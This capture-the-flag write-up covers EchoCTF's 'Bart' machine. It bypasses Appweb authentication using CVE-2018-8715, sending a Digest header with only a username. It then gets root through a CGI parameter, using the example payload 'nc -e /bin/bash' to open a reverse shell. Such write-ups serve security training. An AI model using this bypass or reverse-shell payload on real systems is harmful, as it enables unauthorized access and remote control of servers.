<br>
<pre class="">    |\/\  ,.
    /   `' |,-,
   /         /_
 _/            /
(.-,--.       /
/o/  o \     /    Bart writeup
\_\    /   _/     URL: art.echocity-f.com
(__`--'    _)     Author: HitmanAlharbi
 /         |      Team: Blackfoxs
(_____,'    \ 
   \_       _\
     `._..-'
</pre>

<br>

<b>Bart wrtieup for EchoCTF Cyber Saber 2019</b>

<br>

The target machine have one "<b><font color=green>open port</font></b>" (<b>8080</b>) 

This port have a service called "<b><font color=blue>Appweb Web Server</font></b>"

Let's open the URL with port <b>8080</b> in the browser because it's web server

When you open the URL it will ask you a password "<b>HTTP Authorization</b>"

We tried default credentials like "admin:admin" but not works

We tried too to brute force the password and username but now works

Okay now we decide to search about "<b>Appweb Web Server</b>" vulnerabilities

We have four CVEs but only one was interesting "<b><font color=red>CVE-2018-8715</font></b>" 

https://github.com/embedthis/appweb/issues/610

The CVE Vulnerability Details said that to bypass the the authentication

You should send the Authorization header with username only without password

For example: "<b><font color=blue>Authorization: Digest username=admin</font></b>"

We test it and really we bypassed the authorization successfully

Now take your flag from the source code and you will discover the main page was fake

We tried to fuzz the URLs but the web server blocked our attempts 

But we know the <b>EchoCTF</b> makers love to use the word "<b>ETSCTF</b>"

Because of that we tried many attempts and we find there is a page called <b><font color=blue>ETSCTF.cgi</font></b>

The Appweb server can run .cgi files without any problem 

Now this page runs the command "<b><font color=red>printenv</font></b>" , first take the two flags from page

The last step to get RCE , try to send a POST request with the parameter "<b><font color=red>ETSCTF</font></b>" has the command

For example: "<b><font color=blue>ETSCTF=nc -e /bin/bash target-ip port</font></b>"

Now you can execute commands with root permissions 

Take all the flags from server like <b>/etc/passwd</b> , <b>/root/ETSCTF</b> and <b>/var/www/html/ETSCTF.html</b>

PS: use grep always for example ( <b> grep -r 'ETSCTF' /var </b> )




